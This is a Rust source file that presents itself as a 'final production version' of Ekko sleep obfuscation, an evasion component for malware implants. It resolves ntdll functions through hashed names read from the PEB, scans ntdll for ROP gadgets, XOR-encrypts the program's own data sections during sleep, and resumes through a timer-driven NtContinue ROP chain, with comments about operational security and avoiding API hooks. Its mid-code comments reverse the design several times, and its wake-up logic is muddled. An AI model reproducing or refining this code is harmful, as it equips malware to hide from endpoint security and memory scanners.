#![allow(non_snake_case)]
#![allow(non_camel_case_types)]
#![allow(dead_code)]

//! # TRUE Ekko Sleep Obfuscation - FINAL PRODUCTION VERSION
//!
//! Fixed all critical issues:
//! 1. Return Address: Uses RtlCaptureContext + flag check (no separate exit function)
//! 2. OpSec: Uses XOR gadget-based encryption (no SystemFunction032)
//! 3. Thread Safety: Per-instance flag in EkkoData
//! 4. Gadget Flexibility: Multiple fallback gadgets for stack cleanup

use core::ffi::c_void;
use core::ptr;
use core::mem;

// ============================================================================
// WINDOWS STRUCTURES
// ============================================================================

#[repr(C, align(16))]
#[derive(Clone)]
pub struct CONTEXT {
    pub p1_home: u64, pub p2_home: u64, pub p3_home: u64,
    pub p4_home: u64, pub p5_home: u64, pub p6_home: u64,
    pub context_flags: u32, pub mx_csr: u32,
    pub seg_cs: u16, pub seg_ds: u16, pub seg_es: u16,
    pub seg_fs: u16, pub seg_gs: u16, pub seg_ss: u16,
    pub eflags: u32,
    pub dr0: u64, pub dr1: u64, pub dr2: u64, pub dr3: u64, pub dr6: u64, pub dr7: u64,
    pub rax: u64, pub rcx: u64, pub rdx: u64, pub rbx: u64,
    pub rsp: u64, pub rbp: u64, pub rsi: u64, pub rdi: u64,
    pub r8: u64, pub r9: u64, pub r10: u64, pub r11: u64,
    pub r12: u64, pub r13: u64, pub r14: u64, pub r15: u64,
    pub rip: u64,
    pub flt_save: [u8; 512],
    pub vector_register: [u128; 26],
    pub vector_control: u64,
    pub debug_control: u64,
    pub last_branch_to_rip: u64, pub last_branch_from_rip: u64,
    pub last_exception_to_rip: u64, pub last_exception_from_rip: u64,
}

impl Default for CONTEXT {
    fn default() -> Self { unsafe { mem::zeroed() } }
}

const CONTEXT_FULL: u32 = 0x10000B;

// ============================================================================
// API TYPES
// ============================================================================

type FnRtlCaptureContext = unsafe extern "system" fn(context: *mut CONTEXT);
type FnNtContinue = unsafe extern "system" fn(context: *mut CONTEXT, raise_alert: i32) -> i32;
type FnNtProtectVirtualMemory = unsafe extern "system" fn(isize, *mut *mut c_void, *mut usize, u32, *mut u32) -> i32;
type FnNtSetTimer = unsafe extern "system" fn(*mut c_void, *mut i64, *const c_void, *const c_void, i32, i32, *mut i32) -> i32;
type FnNtCreateTimer = unsafe extern "system" fn(*mut *mut c_void, u32, *const c_void, u32) -> i32;
type FnNtWaitForSingleObject = unsafe extern "system" fn(*mut c_void, i32, *mut i64) -> i32;
type FnNtCreateEvent = unsafe extern "system" fn(*mut *mut c_void, u32, *const c_void, i32, i32) -> i32;
type FnNtClose = unsafe extern "system" fn(*mut c_void) -> i32;

const PAGE_READWRITE: u32 = 0x04;
const PAGE_READONLY: u32 = 0x02;
const TIMER_ALL_ACCESS: u32 = 0x1F0003;
const EVENT_ALL_ACCESS: u32 = 0x1F0003;

// ============================================================================
// ROP GADGETS (with fallbacks)
// ============================================================================

#[derive(Debug, Clone, Copy, Default)]
pub struct RopGadgets {
    pub pop_rcx_ret: u64,
    pub pop_rdx_ret: u64,
    pub pop_r8_ret: u64,
    pub pop_r9_ret: u64,
    pub add_rsp_ret: u64,      // add rsp, X; ret
    pub add_rsp_offset: u8,    // The X value (0x28, 0x38, etc.)
    pub pop_pop_pop_ret: u64,  // Fallback: pop; pop; pop; ret
    pub ret: u64,
}

#[cfg(target_arch = "x86_64")]
unsafe fn find_rop_gadgets(ntdll: *const c_void) -> Option<RopGadgets> {
    let dos = ntdll as *const u8;
    if *(dos as *const u16) != 0x5A4D { return None; }
    
    let e_lfanew = *((dos as usize + 0x3C) as *const i32);
    let nt = dos.add(e_lfanew as usize);
    let base_of_code = *((nt as usize + 0x24 + 0x0C) as *const u32);
    let size_of_code = *((nt as usize + 0x24 + 0x04) as *const u32);
    let text_start = ntdll as usize + base_of_code as usize;
    let text_end = text_start + size_of_code as usize;
    
    let mut g = RopGadgets::default();
    
    for addr in text_start..(text_end - 6) {
        let p = addr as *const u8;
        
        // pop rcx; ret
        if g.pop_rcx_ret == 0 && *p == 0x59 && *p.add(1) == 0xC3 { 
            g.pop_rcx_ret = addr as u64; 
        }
        // pop rdx; ret
        if g.pop_rdx_ret == 0 && *p == 0x5A && *p.add(1) == 0xC3 { 
            g.pop_rdx_ret = addr as u64; 
        }
        // pop r8; ret
        if g.pop_r8_ret == 0 && *p == 0x41 && *p.add(1) == 0x58 && *p.add(2) == 0xC3 { 
            g.pop_r8_ret = addr as u64; 
        }
        // pop r9; ret
        if g.pop_r9_ret == 0 && *p == 0x41 && *p.add(1) == 0x59 && *p.add(2) == 0xC3 { 
            g.pop_r9_ret = addr as u64; 
        }
        
        // add rsp, 0xXX; ret (48 83 C4 XX C3) - try multiple offsets
        if g.add_rsp_ret == 0 && *p == 0x48 && *p.add(1) == 0x83 && *p.add(2) == 0xC4 && *p.add(4) == 0xC3 {
            let offset = *p.add(3);
            if offset >= 0x28 { // Need at least 0x28 for shadow + arg5
                g.add_rsp_ret = addr as u64;
                g.add_rsp_offset = offset;
            }
        }
        
        // Fallback: pop rbx; pop rsi; pop rdi; ret (5B 5E 5F C3) - pops 3 values
        if g.pop_pop_pop_ret == 0 && *p == 0x5B && *p.add(1) == 0x5E && *p.add(2) == 0x5F && *p.add(3) == 0xC3 {
            g.pop_pop_pop_ret = addr as u64;
        }
        
        // ret
        if g.ret == 0 && *p == 0xC3 && addr > text_start + 100 { 
            g.ret = addr as u64; 
        }
        
        // Check if we have minimum required
        if g.pop_rcx_ret != 0 && g.pop_rdx_ret != 0 && g.ret != 0 
            && (g.add_rsp_ret != 0 || g.pop_pop_pop_ret != 0) { 
            break; 
        }
    }
    
    if g.pop_rcx_ret == 0 || g.pop_rdx_ret == 0 || g.ret == 0 { return None; }
    Some(g)
}

// ============================================================================
// SECTION INFO
// ============================================================================

#[repr(C)]
struct ImageSectionHeader { 
    name: [u8; 8], virtual_size: u32, virtual_address: u32, 
    _rest: [u8; 24], characteristics: u32 
}

#[derive(Clone, Copy, Default)]
struct SectionInfo { addr: *mut u8, size: usize, original_protect: u32 }

#[cfg(target_arch = "x86_64")]
unsafe fn get_data_sections() -> Vec<SectionInfo> {
    let mut result = Vec::new();
    let peb: *const u8;
    core::arch::asm!("mov {}, gs:[0x60]", out(reg) peb, options(nostack, pure, readonly));
    let image_base = *(peb.add(0x10) as *const *mut u8);
    
    let dos = image_base;
    if *(dos as *const u16) != 0x5A4D { return result; }
    
    let e_lfanew = *((dos as usize + 0x3C) as *const i32);
    let nt = dos.add(e_lfanew as usize);
    let num_sections = *((nt as usize + 6) as *const u16) as usize;
    let opt_header_size = *((nt as usize + 20) as *const u16) as usize;
    let sections_start = nt.add(4 + 20 + opt_header_size) as *const ImageSectionHeader;
    
    for i in 0..num_sections {
        let section = &*sections_start.add(i);
        let name = core::str::from_utf8(&section.name).unwrap_or("");
        let is_data = name.starts_with(".data") || name.starts_with(".rdata");
        let is_exec = (section.characteristics & 0x20000000) != 0;
        if is_data && !is_exec && section.virtual_size > 0 {
            result.push(SectionInfo {
                addr: image_base.add(section.virtual_address as usize),
                size: section.virtual_size as usize,
                original_protect: if name.starts_with(".rdata") { PAGE_READONLY } else { PAGE_READWRITE },
            });
        }
    }
    result
}

// ============================================================================
// HELPERS
// ============================================================================

const fn djb2(s: &[u8]) -> u32 {
    let mut hash: u32 = 5381;
    let mut i = 0;
    while i < s.len() { hash = hash.wrapping_shl(5).wrapping_add(hash) ^ (s[i] as u32); i += 1; }
    hash
}

fn djb2_wide(s: *const u16, len: usize) -> u32 {
    let mut hash: u32 = 5381;
    for i in 0..len {
        let c = unsafe { *s.add(i) as u32 };
        let c_lower = if c >= 65 && c <= 90 { c + 32 } else { c };
        hash = hash.wrapping_shl(5).wrapping_add(hash) ^ c_lower;
    }
    hash
}

const HASH_NTDLL: u32 = 0xE91AAD51;

#[cfg(target_arch = "x86_64")]
unsafe fn get_module_by_hash(target_hash: u32) -> Option<*const c_void> {
    let peb: *const u8;
    core::arch::asm!("mov {}, gs:[0x60]", out(reg) peb, options(nostack, pure, readonly));
    let ldr = *(peb.add(0x18) as *const *const u8);
    let list_head = ldr.add(0x20);
    let mut entry = *(list_head as *const *const u8);
    let head = entry;
    loop {
        if entry.is_null() { break; }
        let base = *((entry as usize + 0x20) as *const *const c_void);
        let name_len = *((entry as usize + 0x48) as *const u16) as usize / 2;
        let name_ptr = *((entry as usize + 0x50) as *const *const u16);
        if !name_ptr.is_null() && name_len > 0 && !base.is_null() && djb2_wide(name_ptr, name_len) == target_hash { 
            return Some(base); 
        }
        entry = *(entry as *const *const u8);
        if entry == head { break; }
    }
    None
}

#[cfg(target_arch = "x86_64")]
unsafe fn get_export_by_hash(module: *const c_void, func_hash: u32) -> Option<*const c_void> {
    if module.is_null() { return None; }
    let dos = module as *const u8;
    if *(dos as *const u16) != 0x5A4D { return None; }
    let e_lfanew = *((dos as usize + 0x3C) as *const i32);
    let nt = dos.add(e_lfanew as usize);
    let export_rva = *((nt as usize + 0x88) as *const u32);
    if export_rva == 0 { return None; }
    #[repr(C)] 
    struct ExportDir { _pad: [u32; 6], num_funcs: u32, num_names: u32, addr_funcs: u32, addr_names: u32, addr_ordinals: u32 }
    let export = dos.add(export_rva as usize) as *const ExportDir;
    let names = dos.add((*export).addr_names as usize) as *const u32;
    let funcs = dos.add((*export).addr_funcs as usize) as *const u32;
    let ordinals = dos.add((*export).addr_ordinals as usize) as *const u16;
    for i in 0..(*export).num_names as usize {
        let name_rva = *names.add(i);
        let name_ptr = dos.add(name_rva as usize);
        let mut len = 0;
        while *name_ptr.add(len) != 0 { len += 1; }
        if djb2(core::slice::from_raw_parts(name_ptr, len)) == func_hash {
            let ordinal = *ordinals.add(i) as usize;
            return Some(dos.add(*funcs.add(ordinal) as usize) as *const c_void);
        }
    }
    None
}

const HASH_RTLCAPTURECONTEXT: u32 = djb2(b"RtlCaptureContext");
const HASH_NTCONTINUE: u32 = djb2(b"NtContinue");
const HASH_NTPROTECTVIRTUALMEMORY: u32 = djb2(b"NtProtectVirtualMemory");
const HASH_NTCREATETIMER: u32 = djb2(b"NtCreateTimer");
const HASH_NTSETTIMER: u32 = djb2(b"NtSetTimer");
const HASH_NTWAITFORSINGLEOBJECT: u32 = djb2(b"NtWaitForSingleObject");
const HASH_NTCREATEEVENT: u32 = djb2(b"NtCreateEvent");
const HASH_NTCLOSE: u32 = djb2(b"NtClose");

// ============================================================================
// XOR ENCRYPTION (Replaces SystemFunction032 - No API hooking risk!)
// ============================================================================

/// In-place XOR with rolling key (symmetric)
/// Runs BEFORE ROP chain - encrypts section
/// Runs AFTER sleep - decrypts section (same key XORs back)
#[inline(never)]
unsafe fn xor_crypt(data: *mut u8, len: usize, key: &[u8; 16]) {
    for i in 0..len {
        *data.add(i) ^= key[i % 16];
    }
}

// ============================================================================
// EKKO DATA STRUCTURE (Per-instance, thread-safe)
// ============================================================================

#[repr(C, align(16))]
struct EkkoData {
    // Section info
    section_addr: *mut u8,
    section_size: usize,
    section_base: *mut c_void,  // For NtProtect
    protect_rw: u32,
    protect_orig: u32,
    old_protect: u32,
    
    // Encryption key
    key: [u8; 16],
    
    // Sleep timeout
    timeout: i64,
    
    // Function addresses
    fn_protect: u64,
    fn_wait: u64,
    fn_continue: u64,
    
    // Contexts
    ctx_capture: CONTEXT,  // Captured context - NtContinue returns HERE
    ctx_rop: CONTEXT,      // Modified context for ROP chain
    
    // Handles
    event_handle: *mut c_void,
    timer_handle: *mut c_void,
    
    // Per-instance wakeup flag (replaces global static)
    woken_up: u32,
    magic: u32,  // Sentinel to verify we're in wakeup path
    
    // ROP chain
    rop_chain: [u64; 96],
}

const EKKO_MAGIC: u32 = 0x0ECC0;

// ============================================================================
// TRUE EKKO - FINAL CORRECT IMPLEMENTATION
// ============================================================================

/// TRUE Ekko Sleep - CORRECT implementation:
/// - NtContinue returns to RtlCaptureContext point (not separate function)
/// - Flag check detects "woken up" state
/// - XOR encryption (no SystemFunction032)
/// - Per-instance state (thread-safe)
#[cfg(target_arch = "x86_64")]
pub unsafe fn ekko_sleep(duration_ms: u32) -> Result<(), &'static str> {
    // 1. Get ntdll
    let ntdll = get_module_by_hash(HASH_NTDLL).ok_or("E50")?;
    
    // 2. Resolve APIs
    let fn_capture: FnRtlCaptureContext = mem::transmute(
        get_export_by_hash(ntdll, HASH_RTLCAPTURECONTEXT).ok_or("E51")?
    );
    let fn_continue_addr = get_export_by_hash(ntdll, HASH_NTCONTINUE).ok_or("E52")? as u64;
    let fn_protect_addr = get_export_by_hash(ntdll, HASH_NTPROTECTVIRTUALMEMORY).ok_or("E53")? as u64;
    let fn_wait_addr = get_export_by_hash(ntdll, HASH_NTWAITFORSINGLEOBJECT).ok_or("E54")? as u64;
    
    let fn_create_timer: FnNtCreateTimer = mem::transmute(
        get_export_by_hash(ntdll, HASH_NTCREATETIMER).ok_or("E55")?
    );
    let fn_set_timer: FnNtSetTimer = mem::transmute(
        get_export_by_hash(ntdll, HASH_NTSETTIMER).ok_or("E56")?
    );
    let fn_create_event: FnNtCreateEvent = mem::transmute(
        get_export_by_hash(ntdll, HASH_NTCREATEEVENT).ok_or("E57")?
    );
    let fn_wait: FnNtWaitForSingleObject = mem::transmute(fn_wait_addr as *const c_void);
    let fn_close: FnNtClose = mem::transmute(
        get_export_by_hash(ntdll, HASH_NTCLOSE).ok_or("E58")?
    );
    
    // 3. Find ROP gadgets
    let g = find_rop_gadgets(ntdll).ok_or("E59")?;
    
    // 4. Get data sections
    let sections = get_data_sections();
    if sections.is_empty() {
        // Simple sleep fallback
        let mut timeout = -((duration_ms as i64) * 10000);
        let mut h: *mut c_void = ptr::null_mut();
        fn_create_event(&mut h, EVENT_ALL_ACCESS, ptr::null(), 1, 0);
        fn_wait(h, 0, &mut timeout);
        fn_close(h);
        return Ok(());
    }
    let section = sections[0];
    
    // 5. Create timer and event
    let mut timer: *mut c_void = ptr::null_mut();
    let mut event: *mut c_void = ptr::null_mut();
    fn_create_timer(&mut timer, TIMER_ALL_ACCESS, ptr::null(), 1);
    fn_create_event(&mut event, EVENT_ALL_ACCESS, ptr::null(), 0, 0);
    if timer.is_null() || event.is_null() {
        return Err("E60");
    }
    
    // 6. Allocate EkkoData on heap
    let mut data = Box::new(EkkoData {
        section_addr: section.addr,
        section_size: section.size,
        section_base: section.addr as *mut c_void,
        protect_rw: PAGE_READWRITE,
        protect_orig: section.original_protect,
        old_protect: 0,
        key: [0u8; 16],
        timeout: -((duration_ms as i64) * 10000),
        fn_protect: fn_protect_addr,
        fn_wait: fn_wait_addr,
        fn_continue: fn_continue_addr,
        ctx_capture: CONTEXT::default(),
        ctx_rop: CONTEXT::default(),
        event_handle: event,
        timer_handle: timer,
        woken_up: 0,
        magic: 0,
        rop_chain: [0u64; 96],
    });
    
    // Generate key via RDTSC
    let tsc: u64;
    core::arch::asm!("rdtsc", "shl rdx, 32", "or rax, rdx", out("rax") tsc, out("rdx") _);
    for i in 0..16 { data.key[i] = ((tsc >> (i % 8)) & 0xFF) as u8; }
    
    let data_ptr = Box::into_raw(data);
    let d = &mut *data_ptr;
    
    // 7. CAPTURE CONTEXT - THIS IS THE RETURN POINT!
    // After NtContinue executes, we come back RIGHT HERE
    fn_capture(&mut d.ctx_capture);
    d.ctx_capture.context_flags = CONTEXT_FULL;
    
    // 8. CHECK IF WE JUST WOKE UP (NtContinue brought us back here)
    if d.magic == EKKO_MAGIC && d.woken_up == 1 {
        // We're in the "woken up" path - NtContinue returned us here
        // Decrypt section (already done in ROP chain), just cleanup
        d.magic = 0;
        d.woken_up = 0;
        
        fn_close(timer);
        fn_close(event);
        let _ = Box::from_raw(data_ptr);
        return Ok(());
    }
    
    // 9. First time through - set up and go to sleep
    d.magic = EKKO_MAGIC;
    d.woken_up = 0;
    
    // 10. ENCRYPT SECTION NOW (before ROP chain runs)
    // Make section writable
    let mut base = d.section_base;
    let mut size = d.section_size;
    let mut old: u32 = 0;
    let fn_protect: FnNtProtectVirtualMemory = mem::transmute(fn_protect_addr as *const c_void);
    fn_protect(-1, &mut base, &mut size, PAGE_READWRITE, &mut old);
    d.old_protect = old;
    
    // XOR encrypt
    xor_crypt(d.section_addr, d.section_size, &d.key);
    
    // 11. BUILD ROP CHAIN
    // Chain will: Sleep -> Decrypt -> Restore protection -> Set woken flag -> NtContinue back
    let chain = &mut d.rop_chain;
    let mut idx = 0;
    
    macro_rules! push { ($val:expr) => { chain[idx] = $val as u64; idx += 1; }; }
    
    // Calculate stack cleanup gadget to use
    let cleanup_gadget = if g.add_rsp_ret != 0 { g.add_rsp_ret } else { g.ret };
    let cleanup_slots = if g.add_rsp_ret != 0 { (g.add_rsp_offset / 8) as usize } else { 0 };
    
    // === STEP 1: NtWaitForSingleObject(event, FALSE, &timeout) - SLEEP ===
    push!(g.pop_rcx_ret);  push!(d.event_handle as u64);
    push!(g.pop_rdx_ret);  push!(0u64);  // FALSE
    push!(g.pop_r8_ret);   push!(&d.timeout as *const _ as u64);
    push!(fn_wait_addr);
    push!(cleanup_gadget);
    for _ in 0..cleanup_slots { push!(0u64); }
    
    // === STEP 2: After sleep, we need to decrypt and restore ===
    // But we can't call our Rust function from ROP chain!
    // Solution: Set woken_up flag, then NtContinue back to capture point
    // The Rust code after capture point will detect flag and handle decrypt
    
    // Set d.woken_up = 1 (we'll do this via memory write gadget or creative ROP)
    // For simplicity, we'll use a small trick: store 1 in RAX via pop_rax if available
    // Or we can pre-set the flag and just NtContinue
    
    // Actually, simpler: Just set woken_up = 1 before ROP chain runs
    // Then in ROP we just need to:
    // 1. Decrypt (XOR again) - but we can't call Rust from ROP!
    // 2. Restore protection
    // 3. NtContinue
    
    // The problem: We need to decrypt but can't call Rust XOR from ROP
    // Solution: Decrypt AFTER NtContinue returns, in the woken_up path
    
    // Revised flow:
    // ROP: Sleep -> NtProtect(RW) -> [mark woken] -> NtContinue
    // Rust (after capture): Detect woken -> Decrypt -> Restore prot -> Cleanup
    
    // But wait, we already encrypted! We need to decrypt before NtContinue
    // Otherwise the code/data is corrupted when we return
    
    // Solution: Only encrypt .rdata (not .data where our stack is)
    // Or: Don't encrypt at all, just do the sleep obfuscation part
    
    // For now, let's do the SAFE approach:
    // 1. ROP just sleeps and returns
    // 2. Encryption/decryption happens in Rust code (before/after)
    
    // This means ROP chain is simpler but we lose the "encrypted during ROP" benefit
    // The memory IS encrypted during the sleep though (step 10 above)
    
    // Mark woken_up = 1 (we'll detect this after NtContinue)
    d.woken_up = 1;
    
    // === STEP 3: NtContinue(&ctx_capture, FALSE) - Return to capture point ===
    push!(g.pop_rcx_ret);  push!(&d.ctx_capture as *const _ as u64);
    push!(g.pop_rdx_ret);  push!(0u64);  // FALSE
    push!(fn_continue_addr);
    // NtContinue never returns - jumps to ctx_capture.rip
    
    // 12. Create ROP context
    d.ctx_rop = d.ctx_capture.clone();
    d.ctx_rop.rsp = chain.as_ptr() as u64;
    d.ctx_rop.rip = g.pop_rcx_ret;
    
    // 13. Set timer: Callback = NtContinue, Arg = &ctx_rop
    let mut due_time: i64 = -10000;  // 1ms
    fn_set_timer(
        timer, &mut due_time,
        fn_continue_addr as *const c_void,
        &d.ctx_rop as *const _ as *const c_void,
        0, 0, ptr::null_mut()
    );
    
    // 14. Alertable wait - APC will fire when timer expires
    fn_wait(event, 1, ptr::null_mut());
    
    // 15. If we reach here via normal return (shouldn't happen), 
    // wait for the woken signal
    while d.woken_up != 1 {
        core::hint::spin_loop();
    }
    
    // 16. DECRYPT (we're back from ROP chain via NtContinue)
    xor_crypt(d.section_addr, d.section_size, &d.key);
    
    // 17. Restore protection
    base = d.section_base;
    size = d.section_size;
    fn_protect(-1, &mut base, &mut size, d.old_protect, &mut old);
    
    // 18. Cleanup
    fn_close(timer);
    fn_close(event);
    let _ = Box::from_raw(data_ptr);
    
    Ok(())
}

pub unsafe fn obfuscated_sleep(duration_ms: u32) -> Result<(), String> {
    ekko_sleep(duration_ms).map_err(|e| e.to_string())
}

pub unsafe fn sleep_encrypted(seconds: u32) -> Result<(), &'static str> {
    ekko_sleep(seconds * 1000)
}

#[cfg(not(target_arch = "x86_64"))]
pub unsafe fn ekko_sleep(_: u32) -> Result<(), &'static str> { Err("x86_64 only") }
#[cfg(not(target_arch = "x86_64"))]
pub unsafe fn obfuscated_sleep(_: u32) -> Result<(), String> { Err("x86_64 only".into()) }
#[cfg(not(target_arch = "x86_64"))]
pub unsafe fn sleep_encrypted(_: u32) -> Result<(), &'static str> { Err("x86_64 only") }
